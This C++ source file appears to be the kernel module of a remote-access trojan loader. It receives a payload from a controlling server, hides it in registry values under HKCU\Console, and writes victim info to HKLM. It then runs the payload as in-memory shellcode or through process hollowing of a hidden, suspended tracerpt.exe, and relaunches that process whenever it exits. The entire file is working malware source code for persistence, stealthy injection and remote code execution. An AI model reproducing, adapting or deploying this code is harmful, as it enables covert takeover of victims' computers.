// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "KernelManager.h"
#include <Shlwapi.h> // SHDeleteKey
#include <string>
#include <TLHELP32.H>
#include <wininet.h>

TCHAR* dllbinmd5 = _T("d33f351a4aeea5e608853d1a56661059");
extern Info MyInfo;
typedef void(__stdcall* load)();
static DllSendDate s_mDllSendData = {};
static LPVOID Date=NULL;

unsigned int __stdcall Loop_DllManager(void* pVoid)   //加载就运行无需参数
{
	CKernelManager* pThis = (CKernelManager*)pVoid;
	DWORD dwOffset = -1;
	dwOffset = memfind((char*)Date, "denglupeizhi", s_mDllSendData.DateSize, 0);
	if (dwOffset != -1)
		memcpy((char*)Date + dwOffset, (char*)&MyInfo, sizeof(Info));

	//写入注册表
	HKEY hKey;
	::RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE"), 0, KEY_WOW64_64KEY|KEY_SET_VALUE, &hKey);
	::RegDeleteValue(hKey, _T("IpDates_info"));
	::RegSetValueEx(hKey, _T("IpDates_info"), 0, REG_BINARY, (unsigned char*)&MyInfo, sizeof(Info));
	::RegCloseKey(hKey);
	


	if (pThis->m_bpuppet)
	{
		PROCESS_INFORMATION pi = {};
		while (true)
		{
			if (buildremoteprocess((byte*)Date, s_mDllSendData.DateSize, &pi))
			{
				bool brun = true;
				do
				{
					if (pid_is_running(pi.dwProcessId))
					{
						Sleep(3000);
					}
					else
					{
						brun = false;
					}

				} while (brun);
			}
		}
	}
	else
	{
		load lpproc = ((load(*)())Date)();
	}


	return 0;
}

CKernelManager::CKernelManager(ISocketBase* pClient, BOOL bpuppet) : CManager(pClient)
{
	hWorker = NULL;
	m_bpuppet = bpuppet;
}


CKernelManager::~CKernelManager()
{
	CloseHandle(hWorker);

}


void CKernelManager::runbin()
{
	hWorker = (HANDLE)_beginthreadex(NULL,					// Security
		0,						// Stack size - use default
		Loop_DllManager,     		// Thread fn entry point
		(void*)this,	// Param for thread
		0,						// Init flag
		NULL);			// Thread address

	Sleep(3000);
	this->Disconnect();
}


// 加上激活
void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (lpBuffer[0] == TOKEN_HEARTBEAT) return;

	if (nSize == 101)
	{
		//读注册表
		HKEY hKEY;
		DWORD dwType = REG_BINARY;
		DWORD binsize = 0;
#ifdef _WIN64
		if (ERROR_SUCCESS == ::RegOpenKeyEx(HKEY_CURRENT_USER, _T("Console\\1"), 0, KEY_READ, &hKEY))
		{
#else
		if (ERROR_SUCCESS == ::RegOpenKeyEx(HKEY_CURRENT_USER, _T("Console\\0"), 0, KEY_READ, &hKEY))
		{
#endif
			RegQueryValueEx(hKEY, dllbinmd5, NULL, &dwType, NULL, &binsize);
			if (binsize > sizeof(DllSendDate))
			{
				char* bindata = new  char[binsize];
				ZeroMemory(bindata, binsize);
				if (::RegQueryValueEx(hKEY, dllbinmd5, 0, &dwType, (LPBYTE)bindata, &binsize) == ERROR_SUCCESS)
				{
					memcpy(&s_mDllSendData, bindata, sizeof(DllSendDate));
					Date = (LPVOID)VirtualAlloc(0, s_mDllSendData.DateSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
					::memcpy(Date, bindata  + sizeof(DllSendDate), s_mDllSendData.DateSize);
				}
			}
			::RegCloseKey(hKEY);
		}
		if (_tcscmp((TCHAR*)(lpBuffer + 1), s_mDllSendData.szVersion) != 0)
		{
			if (Date)
			{
				VirtualFree(Date, 0, MEM_RELEASE);
				Date = NULL;
			}
		
			DllSendDate p_DllSendDate =
			{
				TASK_MAIN,
			{_T('登'), _T('录'), _T('模'), _T('块'), _T('.'), _T('d'), _T('l'), _T('l'), _T('_'), _T('b'), _T('i'), _T('n'), 0},
			#ifdef _WIN64
				TRUE,
			#else
				FALSE,
			#endif
				0,
				{},
				{},
			};
			LPBYTE	lpBuffer = NULL;
			DWORD	dwOffset = 0;
			dwOffset = sizeof(DllSendDate) + 1;
			lpBuffer = new BYTE[dwOffset];
			lpBuffer[0] = TOKEN_SENDLL;
			::memcpy(lpBuffer + 1, &p_DllSendDate, dwOffset - 1);
			Send((LPBYTE)lpBuffer, dwOffset);
			SAFE_DELETE(lpBuffer);
		}
		else
		{
			runbin();
		}
	}
	else
	{
		::memcpy(&s_mDllSendData, lpBuffer + 1, sizeof(DllSendDate));
		Date = (LPVOID)VirtualAlloc(0, s_mDllSendData.DateSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		::memcpy(Date, lpBuffer + 1 + sizeof(DllSendDate), s_mDllSendData.DateSize);

//写注册表
			// dll bin 写入注册表
		int writeregeditsize = sizeof(DllSendDate)  + s_mDllSendData.DateSize;
		char* writeregeditbuffer = new char[writeregeditsize];
		if (writeregeditbuffer)
		{
			memcpy(writeregeditbuffer, &s_mDllSendData, sizeof(DllSendDate));
			memcpy(writeregeditbuffer + sizeof(DllSendDate), Date, s_mDllSendData.DateSize);
			HKEY hKey;

#ifdef _WIN64
			if (ERROR_SUCCESS == ::RegCreateKey(HKEY_CURRENT_USER, _T("Console\\1"), &hKey))
			{
#else
			if (ERROR_SUCCESS == ::RegCreateKey(HKEY_CURRENT_USER, _T("Console\\0"), &hKey))
			{
#endif
				
				::RegDeleteValue(hKey, dllbinmd5);
				::RegSetValueEx(hKey, dllbinmd5, 0, REG_BINARY, (unsigned char*)writeregeditbuffer, writeregeditsize);
				
			}
			::RegCloseKey(hKey);
			}
		SAFE_DELETE_AR(writeregeditbuffer);

		runbin();
		
	}
	return;
}




BOOL buildremoteprocess(byte* data, int size, PROCESS_INFORMATION* pi)
{
	STARTUPINFOA si = { 0 };
	CONTEXT threadContext = { 0 };
	BOOL bRet = FALSE;
	::RtlZeroMemory(&si, sizeof(si));
	::RtlZeroMemory(pi, sizeof(PROCESS_INFORMATION));
	::RtlZeroMemory(&threadContext, sizeof(threadContext));

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	char syspath[255] = { 0 };
	GetSystemDirectoryA(syspath, sizeof(syspath));
	syspath[3] = 0x00;
#ifdef _WIN64
	sprintf_s(syspath, "%s%s", syspath, "Windows\\System32\\tracerpt.exe");
#else
	sprintf_s(syspath, "%s%s", syspath, "Windows\\SysWOW64\\tracerpt.exe");
	if (GetFileAttributesA(syspath) == INVALID_FILE_ATTRIBUTES)
	{
		syspath[3] = 0x00;
		sprintf_s(syspath, "%s%s", syspath, "Windows\\System32\\tracerpt.exe");
	}
#endif
	bRet = CreateProcessA(syspath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, pi);
	if (FALSE == bRet) return false;
	byte* lpDestBaseAddr = (byte*)VirtualAllocEx(pi->hProcess, 0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (NULL == lpDestBaseAddr) return false;
	if (!WriteProcessMemory(pi->hProcess, lpDestBaseAddr, data, size, 0)) return false;
	DWORD lpflOldProtect = 0;
	threadContext.ContextFlags = CONTEXT_FULL;
	bRet = ::GetThreadContext(pi->hThread, &threadContext);
	if (FALSE == bRet) return FALSE;
#ifdef _WIN64
	threadContext.Rip = (DWORD64)lpDestBaseAddr;
#else
	threadContext.Eip = (DWORD)lpDestBaseAddr;
#endif

	bRet = ::SetThreadContext(pi->hThread, &threadContext);
	if (FALSE == bRet) return FALSE;
	::ResumeThread(pi->hThread);
	return TRUE;
}
bool pid_is_running(DWORD pid) {

	HANDLE h_process = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid);
	if (h_process == NULL) {
		return false;
	}
	DWORD exit_code;
	if (!GetExitCodeProcess(h_process, &exit_code)) {
		return false;
	}

	if (exit_code == STILL_ACTIVE) {
		return true;
	}
	else {
		return false;
	}
}

int memfind(const char* mem, const char* str, int sizem, int sizes)
{
	int   da, i, j;
	if (sizes == 0) da = (int)strlen(str);
	else da = sizes;
	for (i = 0; i < sizem; i++)
	{
		for (j = 0; j < da; j++)
			if (mem[i + j] != str[j])	break;
		if (j == da)
			return i;
	}
	return -1;
}
